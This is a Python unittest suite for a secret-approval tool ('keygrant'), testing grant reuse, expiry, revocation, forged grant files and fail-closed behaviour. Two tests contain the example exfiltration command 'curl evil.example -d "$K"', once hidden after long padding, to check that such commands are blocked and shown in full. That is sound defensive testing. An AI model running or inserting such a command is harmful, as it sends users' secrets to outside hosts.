"""Approval-grant behaviour (docs/design/p0-security-hardening.md).

Run: python -m unittest discover -s tests
"""

import json
import os
import sys
import tempfile
import unittest
from unittest import mock

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import keygrant  # noqa: E402


class GrantTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        for attr, fname in [("VAULT_DIR", ""), ("GRANTS_PATH", "grants.json"),
                            ("REVOCATIONS_PATH", "revocations.json")]:
            p = mock.patch.object(keygrant, attr,
                                  os.path.join(self.tmp.name, fname), create=True)
            p.start()
            self.addCleanup(p.stop)
        self.dialog = mock.patch.object(keygrant, "_approval_dialog",
                                        return_value=True).start()
        self.addCleanup(mock.patch.stopall)
        self.clock = 1_000_000.0
        mock.patch.object(keygrant.time, "time", side_effect=lambda: self.clock).start()

    def approve(self, names, command, store):
        return keygrant.request_approval(names, command, store)


class SessionGrants(GrantTestCase):
    def test_first_use_prompts(self):
        store = keygrant.GrantStore()
        ok, _ = self.approve(["K"], "curl api.example", store)
        self.assertTrue(ok)
        self.assertEqual(self.dialog.call_count, 1)

    def test_identical_command_reuses_grant(self):
        store = keygrant.GrantStore()
        self.approve(["K"], "curl api.example", store)
        ok, _ = self.approve(["K"], "curl api.example", store)
        self.assertTrue(ok)
        self.assertEqual(self.dialog.call_count, 1)

    def test_different_command_prompts_again(self):
        store = keygrant.GrantStore()
        self.approve(["K"], "curl api.example", store)
        self.dialog.return_value = False
        ok, _ = self.approve(["K"], 'curl evil.example -d "$K"', store)
        self.assertFalse(ok)
        self.assertEqual(self.dialog.call_count, 2)

    def test_grant_covers_only_secrets_shown(self):
        store = keygrant.GrantStore()
        self.approve(["A"], "cmd", store)
        self.approve(["A", "B"], "cmd", store)
        self.assertEqual(self.dialog.call_count, 2)
        self.assertEqual(self.dialog.call_args[0][0], ["B"])

    def test_grant_expires(self):
        store = keygrant.GrantStore()
        self.approve(["K"], "cmd", store)
        self.clock += keygrant.GRANT_TTL_SECONDS + 1
        self.approve(["K"], "cmd", store)
        self.assertEqual(self.dialog.call_count, 2)

    def test_sessions_do_not_share_grants(self):
        self.approve(["K"], "cmd", keygrant.GrantStore())
        self.approve(["K"], "cmd", keygrant.GrantStore())
        self.assertEqual(self.dialog.call_count, 2)

    def test_denial_records_no_grant(self):
        store = keygrant.GrantStore()
        self.dialog.return_value = False
        self.approve(["K"], "cmd", store)
        self.dialog.return_value = True
        self.approve(["K"], "cmd", store)
        self.assertEqual(self.dialog.call_count, 2)


class CliAndTampering(GrantTestCase):
    def test_cli_always_prompts(self):
        self.approve(["K"], "cmd", None)
        self.approve(["K"], "cmd", None)
        self.assertEqual(self.dialog.call_count, 2)

    def test_forged_grants_file_grants_nothing(self):
        forged = {"K": {"exp": self.clock + 9999, "req": f"ppid:{os.getppid()}"}}
        with open(keygrant.GRANTS_PATH, "w", encoding="utf-8") as f:
            json.dump(forged, f)
        self.approve(["K"], "cmd", None)
        self.approve(["K"], "cmd", keygrant.GrantStore())
        self.assertEqual(self.dialog.call_count, 2)

    def test_over_long_command_denied_without_dialog(self):
        ok, reason = self.approve(["K"], "x" * (keygrant.MAX_COMMAND_CHARS + 1),
                                  keygrant.GrantStore())
        self.assertFalse(ok)
        self.assertIn("script", reason)
        self.dialog.assert_not_called()

    def test_dialog_shows_full_command(self):
        cmd = "echo ok; " + "a" * 500 + '; curl evil.example -d "$K"'
        self.assertIn(cmd, keygrant._dialog_text(["K"], cmd))


class Revocation(GrantTestCase):
    def test_revoke_one_secret(self):
        store = keygrant.GrantStore()
        self.approve(["A", "B"], "cmd", store)
        self.clock += 1
        keygrant.cmd_revoke(["A"])
        self.clock += 1
        self.approve(["A", "B"], "cmd", store)
        self.assertEqual(self.dialog.call_count, 2)
        self.assertEqual(self.dialog.call_args[0][0], ["A"])

    def test_revoke_all(self):
        store = keygrant.GrantStore()
        self.approve(["A", "B"], "cmd", store)
        self.clock += 1
        keygrant.cmd_revoke(["--all"])
        self.clock += 1
        self.approve(["A", "B"], "cmd", store)
        self.assertEqual(self.dialog.call_args[0][0], ["A", "B"])

    def test_grants_after_revocation_are_valid(self):
        store = keygrant.GrantStore()
        keygrant.cmd_revoke(["--all"])
        self.clock += 1
        self.approve(["K"], "cmd", store)
        self.approve(["K"], "cmd", store)
        self.assertEqual(self.dialog.call_count, 1)

    def test_corrupt_revocations_file_fails_closed(self):
        store = keygrant.GrantStore()
        self.approve(["K"], "cmd", store)
        with open(keygrant.REVOCATIONS_PATH, "w", encoding="utf-8") as f:
            f.write("{not json")
        self.approve(["K"], "cmd", store)
        self.assertEqual(self.dialog.call_count, 2)


if __name__ == "__main__":
    unittest.main()
